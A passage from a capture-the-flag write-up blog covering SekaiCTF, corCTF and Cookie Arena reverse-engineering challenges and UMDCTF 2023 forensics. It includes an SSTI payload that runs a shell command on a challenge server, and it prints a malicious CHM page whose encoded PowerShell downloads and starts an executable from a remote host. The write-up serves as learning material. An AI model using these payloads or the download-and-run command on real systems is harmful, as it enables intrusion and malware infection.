[BitVec(f\u0026#39;x{i}\u0026#39;, 8) for i in range(7)] _buffer = buffer[:] buffer = [ZeroExt(24, x) for x in buffer] v8 = 7 * RotateLeft(1507359807 * RotateRight(422871738 * Concat(*_buffer[:4][::-1]), 15), 11) v9 = RotateRight(422871738 * ((buffer[5] \u0026lt;\u0026lt; 8) ^ (buffer[6] \u0026lt;\u0026lt; 16) ^ buffer[4]), 15) v10 = 1984242169 * ((v8 + 1204333666) ^ (1507359807 * v9) ^ 7 ^ LShR((v8 + 1204333666) ^ (1507359807 * v9), 16)) s = Solver() s.add([And(x \u0026gt;= 0x30, x \u0026lt;= 0x39) for x in _buffer]) shr13 = (LShR(v10, 13) ^ v10) s.add((LShR((-1817436554 * shr13), 16) ^ (-1817436554 * shr13)) == 261736481) print(bytes([s.model()[x].as_long() for x in _buffer])) Check layer 2 1 2 3 4 5 6 7 8 9 10 11 12 13 14 v10 = copy_from_user(buffer, a3, 12LL); if ( !v10 ) { do { buffer[v10] += buffer[v10 + 1] * ~(_BYTE)v10; ++v10; } while ( v10 != 12 ); if ( *(_QWORD *)buffer != 0x788C88B91D88AF0ELL || *(_DWORD *)\u0026amp;buffer[8] != 2113081836 || buffer[12] ) return 0LL; printk(\u0026amp;unk_2EB, a3); return 1LL; } Layer 2, although it has 12 char, is easier to solve. Here, we will have 1 more hint to make solving easier, that the last character will be \u0026ldquo;}\u0026rdquo; :\u0026gt;\nThere are also other conditions:\nbuffer[i] += buffer[i + 1] * ~(_BYTE)v10; (i from 0 to 12) buffer[12] = 0 so buffer[11] = \u0026lsquo;}\u0026rsquo; Based on this, I can build the code through z3:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 def solve_buffer(): s = Solver() buffer = [BitVec(i, 8) for i in range(13)] buffer_ = [BitVec(i, 8) for i in range(13)] for i in range(12): buffer_[i] = buffer[i] + buffer[i + 1] * ~BitVecVal(i, 8) for i in range(12): s.add(And(buffer[i] \u0026gt;= 0x20, buffer[i] \u0026lt;= 0x7e)) s.add(Concat(buffer_[7], buffer_[6], buffer_[5], buffer_[4], buffer_[3], buffer_[2], buffer_[1], buffer_[0]) == 0x788C88B91D88AF0E) s.add(Concat(buffer_[11], buffer_[10], buffer_[9], buffer_[8]) == 2113081836) if s.check() == sat: x = s.model() result = [] for i in range(13): result.append(int(str(x[buffer[i]]))) return result else: return None def main(): result = solve_buffer() print(\u0026#39;\u0026#39;.join(chr(val) for val in result)) if __name__ == \u0026#34;__main__\u0026#34;: main() \u0026ndash;\u0026gt; SEKAIPL@YER}\nflag: SEKAI{6001337SEKAIPL@YER}\nSekaiCTF 2023 - REV Reviews The reverse challenges of SekaiCTF are diverse, new + extremely difficult If I let myself play only one topic, I\u0026rsquo;ll probably cry, so I should play a few more to keep rank :\u0026lt; The most unfortunate thing about this tournament is probably not re3 but the lack of pwn1 (wasting too much time doing pwn2), that\u0026rsquo;s all, stopping at top xx/981 is good, next year I will take revenge: \u0026gt; ","date":"2023-08-27T00:00:00Z","image":"/p/sekaictf-2023-reverse-engineering/featured-image_hu53ff5d738f6f6b8e65c2845372b95fb7_671573_120x120_fill_box_smart1_3.png","permalink":"/p/sekaictf-2023-reverse-engineering/","title":"SekaiCTF 2023 | Reverse Engineering"},{"content":"Pyreverse Trong quá trình phân tích các Tool Auto Game, chúng mình phát hiện ra kỹ thuật khá phổ biến trong việc viết mã và đóng gói chương trình. Hãy tìm ra kỹ thuật này và tìm cách dịch ngược chúng, FLAG bí mật ẩn được ẩn chứa bên trong.\nSử dụng pydumpck để decompile exe \u0026ndash;\u0026gt; py:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 # pyreverser.pyc.cdc.py import base64 def reverse_string(s): return s[::-1] def scramble_flag(flag): scrambled = \u0026#39;\u0026#39; for i, char in enumerate(flag): if i % 2 == 0: scrambled += chr(ord(char) + 1) continue scrambled += chr(ord(char) - 1) return scrambled def main(): print(base64.b64decode(\u0026#39;Q0hIe3B5dGhvbjJFeGlfUmV2ZXJzZV9FTmdpbmVyaW5nfQ==\u0026#39;)) secret_flag = scramble_flag(reverse_string(base64.b64decode(\u0026#39;Q0hIe3B5dGhvbjJFeGlfUmV2ZXJzZV9FTmdpbmVyaW5nfQ==\u0026#39;)).decode()) print(\u0026#39;Welcome to PyReverser!\u0026#39;) print(\u0026#39;Please enter a word or phrase:\u0026#39;) user_input = input() generated_value = scramble_flag(reverse_string(user_input.upper())) print(\u0026#39;Generated value:\u0026#39;, generated_value) print(\u0026#39;Can you find the hidden flag?\u0026#39;) reversed_flag = reverse_string(secret_flag) print(\u0026#39;Reversed flag:\u0026#39;, reversed_flag) if __name__ == \u0026#39;__main__\u0026#39;: main() Để ý flag được decode từ đoạn base64 bên trên\n1 2 root@Spid3r:~# echo \u0026#39;Q0hIe3B5dGhvbjJFeGlfUmV2ZXJzZV9FTmdpbmVyaW5nfQ==\u0026#39; | base64 -d CHH{python2Exi_Reverse_ENginering} Jump Thử thách mô phỏng lại thuật toán sinh key bản quyền phần mềm, hãy chạy thử file chương trình và dịch ngược chúng để tìm FLAG ẩn chứa bên trong​\nPhân tích file Để ý rằng đây chỉ là 1 file exe có thể decompile 1 cách đơn giản (Ở đây thì mình chẳng thấy có chỗ nào gọi là sinh key bản quyền phần mềm cả)\nLợi dụng chạy hàm _flag bằng cách nhập ​địa chỉ _flag vào ô nhập khi chạy jump.exe\nTìm địa chỉ _flag và lấy flag Cách 1 (tìm trực tiếp địa chỉ _flag thông qua đoạn mã được dump) Cách 2 (Sử dụng edit function để kiểm tra địa chỉ hàm flag) Lưu ý: địa chỉ 00401500 đang ở hexa \u0026ndash;\u0026gt; đổi sang decimal là 4199680​\nRev1 Thử thách mô phỏng lại thuật toán sinh key bản quyền phần mềm, hãy chạy thử file chương trình và dịch ngược chúng để tìm FLAG ẩn chứa bên trong.\nPhân tích file PE32 \u0026ndash;\u0026gt; 32 bits\nGUI \u0026ndash;\u0026gt; WinMain\nWinMain Xử lý I/O Kiểm tra trong DialogBoxParamA\nHàm GetItemTextA sẽ lấy các string được input vào và check key qua sub_402030\nKiểm tra hàm này thì thấy rằng dword_414448 chưa được khởi tạo vì vậy chúng ta sẽ debug để xem nó là gì (xem video dưới đây)\nDebug Your browser doesn't support HTML5 video. Here is a\rlink to the video instead.\rDựa vào những gì debug được có thể viết lại đoạn code dưới đây:\nĐến đây thì chỉ đơn giản là dùng z3 để viết script giải solve_rev1.py để lấy key\nCV Malware Thời gian gần đây có nhiều hình thức xâm nhập vào máy tính nạn nhân thông qua mã độc được gắn trong file Word. Khi mã độc thực thi, chúng sẽ lấy thông tin của nạn nhân để gửi về máy chủ điều khiển C\u0026amp;C. Liệu hacker cũng có thể thể bị hack, hãy cùng đi săn kẻ xấu nhé!\nMang tiếng Malware nhưng là bài duy nhất rev tải về không bị Windows tự động phát hiện và xoá :))\nPhân tích file Dựa vào kiểm tra header của file thì linux cho rằng đây là 1 file Word (nhưng thực chất Word được cấu tạo như 1 file Zip)\nUnzip \u0026amp; check Từ đây mình tiến hành giải nén \u0026ldquo;file zip\u0026rdquo; này ra và kiểm tra xem nó có gì lạ hay không (Chú ý đến các file xml xuất hiện trong bản giải nén này)\nQua việc nhìn bằng mắt thường thì cũng thấy rằng đoạn XML này thực ra được mã hóa từ hexa và base64, mình sẽ tiến hành decode nó\nDecode 1 2 3 server: host: http://REPLACE_HOST_HERE secret: SecR3TtOKen Nhìn qua thì đây là giống như 1 chỉ dẫn về host và mật khẩu của server để file này tương tác với nó thì phải\nDựa vào header MZ của đoạn base64 được decode kia thì có thể đoán được đây là 1 file exe trên Windows, export về và load vào IDA để kiểm tra xem nó có gì nào\nmain Nhìn kỹ 1 chút thì ở đây có hàm downloadFile với tham số là REPLACE_HOST_HERE, kiểm tra trực tiếp nó thì thấy được đoạn phương thức GET client.exe từ /static về\nVới host mặc định của challenge thì chắc chắn sẽ lấy file từ http://103.97.125.53:31040/static/client.exe​ truy cập vào đó và lấy file về, có thể đây là phương thức giao tiếp giữa người bị hại và server.\nclient.exe Đây là 1 file được viết bởi Golang, dạo gần đây mình thấy các challenge kiểu tương tác giữa client và server được dùng rất nhiều\nLoad file vào IDA\nDựa vào cách đặt tên thì có thể đoán được:\nmain_getSystemInfo() là hàm lấy các thông tin của máy nạn nhân main_sendPostRequest() là hàm gửi đi các thông tin lấy được (client.exe sẽ tương tác với host) Còn về hàm main_loadAllConfigs() thì mình chưa hình dung ra được nó sẽ làm gì, có thể là liên quan đến việc config nào đó cho phía server hiểu được và lúc này thì có thể để ý đến đoạn chỉ dẫn về host và secret ban nãy main_loadAllConfigs(): Khi để file config cùng trong thư mục với client.exe thì có thấy lỗi về ini \u0026ndash;\u0026gt; đổi thành config.ini và chuyển host: http://103.97.125.53:31040\nBắt tương tác giữa client với host thông qua Wireshark Từ đây có thể thấy client gửi các thông tin về username, hostname từ phía client đồng thời cùng với secret: SecR3TtOken lên server và được trả về Logged username hostname\nTừ đây có thể viết 1 đoạn script mô phỏng việc gửi thông tin và nhận thông tin giữa client và server như sau:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import request url = \u0026#34;http://103.97.125.53:31040\u0026#34; header = { \u0026#34;User-Agent\u0026#34;: \u0026#34;Go-http-server/1.1\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;vb3;q=0.7\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/json\u0026#34;, \u0026#34;Secret\u0026#34;: \u0026#34;SecR3Ttoken\u0026#34; } payload = { \u0026#34;username\u0026#34;: \u0026#34;SPID3R-MSI\\Spid3r\u0026#34;, \u0026#34;hostname\u0026#34;: \u0026#34;Spider-msi\u0026#34; } response = requests.post(url, headers=headers, json=payload) print(response.text) # Logged SPID3R-MSI\\Spid3r Spid3r-msi Vậy thì đã giải quyết xong việc kết nối \u0026ldquo;nhân tạo\u0026rdquo; giữa client và server thông qua đoạn script trên\ndựa vào hint mà nếu không đưa ra thì không ai biết mà giải nổi đến từ tác giả FLAG nằm trên host, tìm cách kết nối đúng và exploit\nthì bây giờ việc quan trọng nhất sẽ là đi tìm lỗi trên server để dựa vào việc khai thác nó và lấy flag\nMay thật, thử phát đầu thì dính đét lỗi SSTI luôn, việc cuối cùng chỉ là viết payload để get flag trực tiếp từ server thôi\nScript giải:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import request url = \u0026#34;http://103.97.125.53:31040\u0026#34; header = { \u0026#34;User-Agent\u0026#34;: \u0026#34;Go-http-server/1.1\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;vb3;q=0.7\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;application/json\u0026#34;, \u0026#34;Secret\u0026#34;: \u0026#34;SecR3Ttoken\u0026#34; } payload = { \u0026#34;username\u0026#34;: \u0026#34;{{url_for.__globals__.os.__dict__.popen(\u0026#39;cat /flag.txt).read()}}\u0026#34;, \u0026#34;hostname\u0026#34;: \u0026#34;Spider-msi\u0026#34; } response = requests.post(url, headers=headers, json=payload) print(response.text) # Logged CHH{ExtR@Ct_m4CRo_aNd_h@Ck_C2c_d791e9a6f418993651267fbae56e3c46} Spid3r-msi ","date":"2023-07-09T00:00:00Z","image":"/p/cookie-arena-2-reverse-engineering/featured_hu1d606a7f3123979285701cf8aea1cd37_774107_120x120_fill_box_smart1_3.png","permalink":"/p/cookie-arena-2-reverse-engineering/","title":"Cookie Arena 2 | Reverse Engineering"},{"content":"Information UMDCTF 2023 starts at 5:00 AM on April 29, 2023, and ends at 5:00 AM on May 1, 2023 (which is not at all suitable for someone like me who loves to sleep in). The challenges in this competition revolve around Pokemon.\nRanking Our team ranked 17th/745 teams with 12,799 points. Detail of scoreboard here\nIt\u0026rsquo;s a bit disappointing that during the competition, I couldn\u0026rsquo;t fully solve the Forensics challenges. By around 5 AM, when the competition ended, I was too exhausted to continue thinking.\nIn this writeup, I will provide solutions for the challenges in ascending order based on their increasing point values.\nMalware Chall Disclaimer This challenge provided hint to the Doctor Hate Him challenge, and I\u0026rsquo;ll discuss that later. Here, they have given the flag.\nUMDCTF{i_understand_that_malware_chall_is_sus}\nMirror Unknown Here we have received a picture (.png file).\nUsing Google Images, we found a cipher alphabet chart.\nThen we put the words obtained into the format of the flag: UMDCTF{} and add the note: Ancient civilizations didn\u0026rsquo;t believe in whitespace or lowercase\nUMDCTF{SINJOHRUINS}\nNo. 352 Here, there is a mention of password 1 and password 2, which made me think of the steghide tool (pay attention to password 1, which is the name of Pokemon number 352 - written in lowercase).\npassword 1: kecleon\n1 2 3 4 ┌──(kali㉿Spid3r)-[~/Downloads] └─$ steghide extract -sf hide-n-seek.jpg Enter passphrase: wrote extracted data to \u0026#34;kecleon.jpg\u0026#34;. and password 2: timetofindwhatkecleonishiding (In the description of the challenge\u0026hellip;)\n1 2 3 4 ┌──(kali㉿Spid3r)-[~/Downloads] └─$ steghide extract -sf kecleon.jpg Enter passphrase: wrote extracted data to \u0026#34;flag.txt\u0026#34;. UMDCTF{KECLE0NNNNN}\nFire Type Pokemon Only In this challenge, we receive a pcapng file. Use Wireshark to read the data.\nI have checked both strings and filtered the captured data, but I haven\u0026rsquo;t found anything other than the files retrieved from FTP.\nBased on the header of the secret file, we can determine that it is a zip file (the remaining files also have the correct format).\nAnd this zip file requires us to enter a password\u0026hellip; to extract a file named wisdom.mp4.\nUpon searching for \u0026lsquo;pass\u0026rsquo; in that pcapng file, we found the actual password for this file..\nYARA Trainer Gym This is quite an interesting challenge that I had the opportunity to explore :))). The challenge provides us with a website to test: https://yara-trainer-gym.chall.lol\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 import \u0026#34;elf\u0026#34; import \u0026#34;math\u0026#34; rule rule1 { condition: uint32(0) == 0x464c457f } rule rule2 { strings: $rocket1 = \u0026#34;jessie\u0026#34; $rocket2 = \u0026#34;james\u0026#34; $rocket3 = \u0026#34;meowth\u0026#34; condition: all of ($rocket*) } rule rule3 { meta: description = \u0026#34;Number of sections in a binary\u0026#34; condition: elf.number_of_sections == 40 } rule rule4 { strings: $hex1 = {73 6f 6d 65 74 68 69 6e 67 73 6f 6d 65 74 68 69 6e 67 6d 61 6c 77 61 72 65} $hex2 = {5445414d524f434b4554} $hex3 = {696d20736f207469726564} $hex4 = {736c656570792074696d65} condition: ($hex1 and $hex2) or ($hex3 and $hex4) } rule rule5 { condition: math.entropy(0, filesize) \u0026gt;= 6 } rule rule6 { strings: $xor = \u0026#34;aqvkpjmdofazwf{lqjm1310\u0026lt;\u0026#34; xor condition: $xor } rule rule7 { condition: for any section in elf.sections : (section.name == \u0026#34;poophaha\u0026#34;) } rule rule8 { condition: filesize \u0026lt; 2MB and filesize \u0026gt; 1MB } Basically, here we have to create a file and upload it to the website (satisfying all 8 rules) in order to obtain the flag.\nI approached it by dividing the file into two separate smaller files (each file satisfying a specific set of rules) to avoid complexity during creation.\nThe first file will satisfy rules 1-4 and 6-7. The second file will satisfy rules 5 and 8 (since generating entropy and file size simultaneously with creating the attributes mentioned above can be a bit challenging).\nFirst file first rule:\nuint32(0) == 0x464c457f\nThis checks whether the first 32 bits (offset 0) have the value 0x464c457f (indicating whether the file is in the ELF format or not)\nTo achieve this, it\u0026rsquo;s quite simple. Just add the value 7f 45 4c 46 corresponding to ELF to the file header.\nsecond rule:\n1 2 3 4 5 6 7 strings: $rocket1 = \u0026#34;jessie\u0026#34; $rocket2 = \u0026#34;james\u0026#34; $rocket3 = \u0026#34;meowth\u0026#34; condition: all of ($rocket*) Rule 2 requires the file to contain the strings: jessie, james, and meowth.\n\u0026ndash;\u0026gt; Convert them to hexadecimal and insert them into the file: 6a 65 73 73 69 65 6a 61 6d 65 73 6d 65 6f 77 74 68\nthird rule:\n1 2 3 4 meta: description = \u0026#34;Number of sections in a binary\u0026#34; condition: elf.number_of_sections == 40 This rule checks if the number of sections in the file is exactly 40. I decided to create a file from C to have multiple initial sections.\n1 2 3 4 5 ┌──(root㉿Spid3r-msi)-[/home/spid3r] └─# echo \u0026#34;int main(){return 0;}\u0026#34; \u0026gt; main.c ┌──(root㉿Spid3r-msi)-[/home/spid3r] └─# gcc -o main main.c Check the number of sections in the newly created main file using the command:\n1 2 ┌──(root㉿Spid3r-msi)-[/home/spid3r] └─# objdump -h main Then add the sections to the main file using the command (each time adding one section, continuously repeating until the main file has 40 sections).\n1 2 ┌──(root㉿Spid3r-msi)-[/home/spid3r] └─# objcopy --add-section .mysection=data.txt main fourth rule\n1 2 3 4 5 6 7 8 strings: $hex1 = {73 6f 6d 65 74 68 69 6e 67 73 6f 6d 65 74 68 69 6e 67 6d 61 6c 77 61 72 65} $hex2 = {5445414d524f434b4554} $hex3 = {696d20736f207469726564} $hex4 = {736c656570792074696d65} condition: ($hex1 and $hex2) or ($hex3 and $hex4) We can choose either hex1 and hex2 or hex3 and hex4 as pairs to insert into the file.\nsixth rule\n1 2 3 4 strings: $xor = \u0026#34;aqvkpjmdofazwf{lqjm1310\u0026lt;\u0026#34; xor condition: $xor Add the string aqvkpjmdofazwf{lqjm1310\u0026lt; to complete the process: 61 71 76 6b 70 6a 6d 64 6f 66 61 7a 77 66 7b 6c 71 6a 6d 31 33 31 30 3c.\nseventh rule\n1 2 condition: for any section in elf.sections : (section.name == \u0026#34;poophaha\u0026#34;) We need a section named poophaha (Please note that with the 40 sections created earlier, one of them should be named poophaha)\n1 2 ┌──(root㉿Spid3r-msi)-[/home/spid3r] └─# objcopy --add-section .poophaha=data.txt main Second file For the remaining part, since rules 5 and 8 go together, I will create a new file and then merge the two files together.\n1 2 3 4 5 6 7 8 9 rule rule5 { condition: math.entropy(0, filesize) \u0026gt;= 6 } rule rule8 { condition: filesize \u0026lt; 2MB and filesize \u0026gt; 1MB } Rule 5 requires the entropy of the file to be greater than or equal to 6, while Rule 8 specifies that the file size must be greater than 1MB and less than 2MB.\nAfter creating the first file, its entropy is quite low (less than 1 dot), so I need to create a new file with a higher entropy to compensate.\nTo achieve an entropy of greater than or equal to 6 (which is quite challenging with files generated from my processes as they often contain repeated bytes), I will create a new file\n1 2 ┌──(root㉿Spid3r-msi)-[/home/spid3r] └─# openssl rand -out random.bin 2000000 2000000 here represents the size of the file after creation. I chose this number to comply with Rule 8, and the entropy of the file random.bin generated is very high :)\nNext, I will combine these two files together. To make it easier with a large number of bytes, I will use CyberChef.\nhex of file và file after creation\nUMDCTF{Y0ur3_4_r34l_y4r4_m4573r!}\nAlso, in this challenge it is possible to increase entropy using a zip file. The algorithm it uses is suitable for pushing up the entropy level, which corresponds to a higher degree of randomness between bytes. Telekinetic Warfare In this challenge, we obtained a GIF file where each frame of the GIF represents a QR code. I wrote a script to separate the QR codes and decode them simultaneously.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 import os import glob from PIL import Image from pyzbar.pyzbar import decode # Replace \u0026#39;path/to/folder\u0026#39; with the actual path to the folder containing the QR codes folder_path = \u0026#39;qrcodes/\u0026#39; output_file = \u0026#39;qr_codes.txt\u0026#39; # Create a list of all the image files in the folder image_files = glob.glob(os.path.join(folder_path, \u0026#39;*.jpg\u0026#39;)) # Open the output file for writing with open(output_file, \u0026#39;w\u0026#39;) as f: # Loop over each image file in the folder for image_file in image_files: # Open the image and decode the QR code image = Image.open(image_file) qr_code = decode(image) # If a QR code was detected, write the URL to the output file if qr_code: url = qr_code[0].data.decode() f.write(url + \u0026#39;\\n\u0026#39;) After running the script, we obtained a bunch of base64 strings, which were then converted into a PDF file. You can view the decoded flag in the decode flag.\nUMDCTF{wh0_n33d5_k1net1c_w4rfar3_anyw4ys}\nDoctors hate him!! Based on the Malware Chall Disclaimer challenge, we can infer that this challenge is related to malware (perhaps reverse malware?). little timmy and i spent the whole night reversing the file that we suspected to be malicious, and the ending was truly unforgettable.\nIn this challenge, I received a chm file. According to my research, it is a Compiled HTML Help file. I tried opening it with Microsoft Help, but didn\u0026rsquo;t find much\u0026hellip; (except for a button that didn\u0026rsquo;t do anything).\nBased on this button, I think it might have originally been a web page\u0026hellip;\nI used the HelpSmith tool and obtained the following zip file.\nYes, it does contain a real web page\u0026hellip; now it\u0026rsquo;s more accurate.\nIn the source code of the web page, there is a base64-encoded string: VU1EQ1RGezE5OTdfY2FsbGVkXw==.\n\u0026ndash;\u0026gt; UMDCTF{1997_called_\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 \u0026lt;PARAM name=\u0026#34;Item1\u0026#34; value=\u0026#39;,cmd.exe,/c powershell.exe -ExecutionPolicy Bypass -NoLogo -NoProfile -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AZABuAHMALQBzAGUAcgB2AGUAcgAuAG8AbgBsAGkAbgBlADoANgA5ADYAOQAvAGUAeABwAGwAbwByAGUALgBlAHgAZQAgAC0ATwB1AHQARgBpAGwAZQAgAGUAeABwAGwAbwByAGUALgBlAHgAZQA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGUAeABwAGwAbwByAGUALgBlAHgAZQA7ACAAPQAnAGcAdQByAGwAXwBqAG4AYQBnAF8AZwB1AHIAdgBlACcA\u0026#39;\u0026gt; \u0026lt;body\u0026gt; \u0026lt;!--VU1EQ1RGezE5OTdfY2FsbGVkXw==--\u0026gt; \u0026lt;OBJECT id=shortcut classid=\u0026#34;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11\u0026#34; width=1 height=1\u0026gt; \u0026lt;PARAM name=\u0026#34;Command\u0026#34; value=\u0026#34;ShortCut\u0026#34;\u0026gt; \u0026lt;PARAM name=\u0026#34;Button\u0026#34; value=\u0026#34;Bitmap::shortcut\u0026#34;\u0026gt; \u0026lt;PARAM name=\u0026#34;Item1\u0026#34; value=\u0026#39;,cmd.exe,/c powershell.exe -ExecutionPolicy Bypass -NoLogo -NoProfile -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AZABuAHMALQBzAGUAcgB2AGUAcgAuAG8AbgBsAGkAbgBlADoANgA5ADYAOQAvAGUAeABwAGwAbwByAGUALgBlAHgAZQAgAC0ATwB1AHQARgBpAGwAZQAgAGUAeABwAGwAbwByAGUALgBlAHgAZQA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGUAeABwAGwAbwByAGUALgBlAHgAZQA7ACAAPQAnAGcAdQByAGwAXwBqAG4AYQBnAF8AZwB1AHIAdgBlACcA\u0026#39;\u0026gt; \u0026lt;PARAM name=\u0026#34;Item2\u0026#34; value=\u0026#34;273,1,1\u0026#34;\u0026gt; \u0026lt;/OBJECT\u0026gt; \u0026lt;SCRIPT\u0026gt; shortcut.Click(); \u0026lt;/SCRIPT\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;text\u0026#34;\u0026gt; \u0026lt;strong\u0026gt; \u0026lt;h1\u0026gt;DOCTORS HATE HIM!!\u0026lt;/h1\u0026gt; \u0026lt;/strong\u0026gt; \u0026lt;p\u0026gt;Do you suffer from low energy, fatigue, and a general lack of motivation? Did your Pokemon leave you for a better trainer? Rocket Corp\u0026#39;s Master Ball Serum can help! Our all-natural formula boosts your energy levels and helps you feel like a young trainer ready to take on the world again!\u0026lt;/p\u0026gt;\u0026lt;button\u0026gt;Find out more!\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;image\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;depressed_pokemon_trainer.png\u0026#34; alt=\u0026#34;Pikachu\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; $env:WEB_REQUEST -Uri http://dns-server:6969/explorer.exe -OutFile explorer.exe; Start-Process explorer.exe and\n1 powershell.exe -ExecutionPolicy Bypass -NoLogo -NoProfile -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AZABuAHMALQBzAGUAcgB2AGUAcgAuAG8AbgBsAGkAbgBlADoANgA5ADYAOQAvAGUAeABwAGwAbwByAGUALgBlAHgAZQAgAC0ATwB1AHQARgBpAGwAZQAgAGUAeABwAGwAbwByAGUALgBlAHgAZQA7AA== Decoding the above base64 string yields Invoke-WebRequest -Uri http://dns-server.online:6969/explore.exe -OutFile explore.exe;\nAfterwards, I found another segment.\n1 SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AZABuAHMALQBzAGUAcgB2AGUAcgAuAG8AbgBsAGkAbgBlADoANgA5ADYAOQAvAGUAeABwAGwAbwByAGUALgBlAHgAZQAgAC0ATwB1AHQARgBpAGwAZQAgAGUAeABwAGwAbwByAGUALgBlAHgAZQA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGUAeABwAGwAbwByAGUALgBlAHgAZQA7ACAAPQAnAGcAdQByAGwAXwBqAG4AYQBnAF8AZwB1AHIAdgBlACcA Decode base64: Invoke-WebRequest -Uri http://dns-server.online:6969/explore.exe -OutFile explore.exe; Start-Process explore.exe; ='gurl_jnag_gurve'\ngurl_jnag_gurve looks quite similar to a flag :)), I used ChatGPT and found out it\u0026rsquo;s ROT13 encoded :))), guessing until death!!!\n\u0026ndash;\u0026gt; they_want_their\nHere comes the one wrong step, one mile astray moment. From those code snippets and the mentioned command, I only interpreted the PowerShell command executing explore.exe in connection with the challenge name Malware Chall Disclaimer. As a result, I misunderstood that I had to dive into researching that malware to trace it down :)), wasting two hours trying to trace and reverse-engineer that explore.exe while also attempting to decipher it before reaching the solution.\nI should have checked the website itself to see if there was anything significant.\nThank goodness! If I hadn\u0026rsquo;t discovered this by accident before the competition was over, I might have given up on forensics altogether.\nUMDCTF{1997_called_they_want_their_malware_back_bozo}\nConclusion In this competition, I think the forensics challenges were not too difficult overall (even the newbie-level could be accessed by around 7 out of 8 tasks). However, some tasks were overly reliant on guessing, which made it a bit frustrating for forensic enthusiasts.\nThanks to Hwi#9932 for helping me identify some misconceptions in the Telekinetic Warfare challenge and to everyone in BKSEC for constantly encouraging me to improve my skills in forensic challenges digital.\n","date":"2023-05-17T00:00:00Z","image":"/p/umdctf-2023-digital-forensics/featured_hu521915a03207d3ded912c6c781e96e24_122168_120x120_fill_box_smart1_3.png","permalink":"/p/umdctf-2023-digital-forensics/","title":"UMDCTF 2023 | Digital Forensics"},{"content":"Microsoft ❤️ Linux Microsoft’s latest addition to the world of Open Source: a flag checker…\nPart 1 analysis Check file \u0026ndash;\u0026gt; elf\ncheck the start function:\nSo easy to see in the loc_100063 stream along with the LINUX system commands, the conclusion is that that the input will be scanned 18 times (1 element each time) then stored in byte_100111, then rol with 0Dh (left shift 13 bits) and compaerd to byte_100210 (in the local)\nCheck byte_100210 (local):\n1 2 3 4 5 6 7 8 9 10 11 00100210 byte_100210 db 6Ch ; DATA XREF: start+1D↑r 00100211 dd offset byte_8E6C4EED 00100215 align 2 00100216 dd offset byte_4CAD666F 0010021A dd offset word_666C864E 0010021E dd offset byte_8E0F6685 00100222 dd offset word_2169633E 00100226 dd offset word_3C79553E 0010022A dd offset byte_3C786A63 0010022E dd offset dword_2C2C6538 00100232 dw 703Ch We can byte_100210: b'l\\xedNl\\x8e\\xccof\\xadLN\\x86lf\\x85f\\x0f\\x8e\u0026gt;ci!\u0026gt;Uy\u0026lt;cjx\u0026lt;8e,,\u0026lt;p'\nNow just write a scipt to find the original flag :333 (reverse the encoding of byte_100210 from the original flag):\nScript part 1 1 2 3 4 5 6 7 8 9 10 from pwn import ror input_data = b\u0026#39;l\\xedNl\\x8e\\xccof\\xadLN\\x86lf\\x85f\\x0f\\x8e\u0026gt;ci!\u0026gt;Uy\u0026lt;cjx\u0026lt;8e,,\u0026lt;p\u0026#39; shifted_data = bytearray() for byte in input_data: shifted_byte = ror(byte, 13, 8) shifted_data.append(shifted_byte) print(shifted_data.decode(\u0026#39;latin-1\u0026#39;)) And what we get is \u0026hellip;\ncorctf{3mbr4c3,3xtñ\\x1bK ñªËá\\x1bSÃáÁ+aaá\nIt seems like i can only get the first half of the flag, which isn\u0026rsquo;t easy by i can input it hix \u0026hellip;\nPart 2 analysis i will carefully check IDA again \u0026amp; see that between function start \u0026amp; byte_100111 along with byte_100210\n1 2 3 4 5 6 7 8 9 001000C2 dd offset dword_168D0AB4 001000C6 dd offset byte_6C60211 001000CA dd offset byte_C6FF0211 001000CE dw 1206h 001000D0 dd offset word_21CDFF02 001000D4 dd 0FE83F631h, 8A117412h, 34021384h, 229C8A0Dh, 75D83803h 001000D4 dd 0EAEB4609h, 33406C7h, 0DB310001h, 3E8309B4h, 